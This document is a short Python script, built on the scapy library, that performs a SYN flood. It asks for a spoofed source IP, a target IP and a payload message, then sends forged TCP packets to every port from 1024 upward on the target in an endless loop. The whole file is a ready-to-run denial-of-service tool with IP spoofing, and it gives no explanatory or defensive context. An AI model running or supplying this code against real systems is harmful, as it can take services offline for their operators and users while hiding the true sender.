#!/usr/bin/python

from scapy.all import *

def synFlood(src,tgt,message):
    for dport in range(1024,65535):
        IPLayer = IP(src=src, dst=tgt)
        TCPLayer = TCP(sport=4444, dport=dport)
        RAWLayer = Raw(load=message)
        pkt = IPLayer/TCPLayer/RAWLayer
        send(pkt)

source = input("[*] Enter Source IP Address To Fake: ")
target = input("[*] Enter Targets IP Address: ")
message = input("[*] Enter The Message For TCP Payload: ")

while True:
    synFlood(source,target,message)
